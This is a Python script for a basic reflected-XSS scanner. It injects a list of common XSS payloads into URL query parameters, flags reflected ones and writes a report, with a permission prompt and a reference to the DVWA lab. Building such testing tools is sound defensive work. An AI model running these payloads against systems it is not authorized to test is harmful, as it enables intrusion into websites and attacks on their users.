import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

# A list of basic XSS payloads to test with
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<script>alert(document.cookie)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert('XSS')",
    "\"><script>alert(1)</script>",
    "';alert('XSS');//"
]

def scan_url_for_xss(url, payloads):
    """
    Scans a single URL by injecting payloads into its query parameters.
    Reports if a payload is reflected in the response.
    """
    parsed_url = urlparse(url)
    params = parse_qs(parsed_url.query)

    if not params:
        print(f"[*] No query parameters to test in: {url}")
        return []

    vulnerable_params = []
    print(f"\n[*] Testing URL: {url}")

    # Test each parameter individually
    for param_name, param_value in params.items():
        original_value = param_value[0]  # Take the first value if multiple exist
        for payload in payloads:
            # Create a new query string with the payload injected into the current parameter
            test_params = params.copy()
            test_params[param_name] = [payload]  # Replace value with payload

            # Rebuild the full URL with the test parameters
            test_query = urlencode(test_params, doseq=True)
            test_url_parts = list(parsed_url)
            test_url_parts[4] = test_query  # 4 is the index for query string
            test_url = urlunparse(test_url_parts)

            try:
                # Send the request (use a timeout and a common User-Agent)
                headers = {'User-Agent': 'Mozilla/5.0 (XSS-Scanner)'}
                response = requests.get(test_url, timeout=5, headers=headers, allow_redirects=False)

                # Check if the payload is reflected in the response text
                if payload in response.text:
                    print(f"    [!] POTENTIAL XSS FOUND on parameter: {param_name}")
                    print(f"        Payload: {payload}")
                    vulnerable_params.append({
                        "url": url,
                        "parameter": param_name,
                        "payload": payload
                    })
                    break  # Move to the next parameter once a vulnerability is found

            except requests.exceptions.RequestException as e:
                print(f"    [*] Error requesting {test_url}: {e}")
                continue  # Skip this payload if there's a connection error

    return vulnerable_params

def generate_report(vulnerable_findings, report_file="xss_report.txt"):
    """Saves the found vulnerabilities to a report file."""
    if not vulnerable_findings:
        print("\n[*] No vulnerabilities found. No report generated.")
        return

    with open(report_file, 'w') as f:
        f.write("Reflected XSS Vulnerability Report\n")
        f.write("=" * 40 + "\n")
        for finding in vulnerable_findings:
            f.write(f"URL: {finding['url']}\n")
            f.write(f"Vulnerable Parameter: {finding['parameter']}\n")
            f.write(f"Proof-of-Concept Payload: {finding['payload']}\n")
            f.write("-" * 20 + "\n")
    print(f"\n[+] Report saved to {report_file}")

# --- Main Execution ---
if __name__ == "__main__":
    print("Simple Reflected XSS Scanner")
    print("Use only against authorized targets like DVWA.\n")

    # --- CONFIGURATION ---
    # Example: Replace with the URL you want to test.
    # For DVWA (Damn Vulnerable Web Application), it might be something like:
    # target_url = "http://localhost/dvwa/vulnerabilities/xss_r/?name=test"
    target_url = input("Enter the full URL with parameters to scan (e.g., http://test-site.com/page?param=test): ")

    # --- PERMISSION CHECK (IMPORTANT) ---
    print("\n[!] LEGAL NOTICE: You must have explicit permission to test this target.")
    confirm = input("Do you have permission? (yes/no): ").strip().lower()
    if confirm != 'yes':
        print("Exiting scanner.")
        exit()

    # Run the scan
    findings = scan_url_for_xss(target_url, XSS_PAYLOADS)

    # Generate the report
    generate_report(findings)
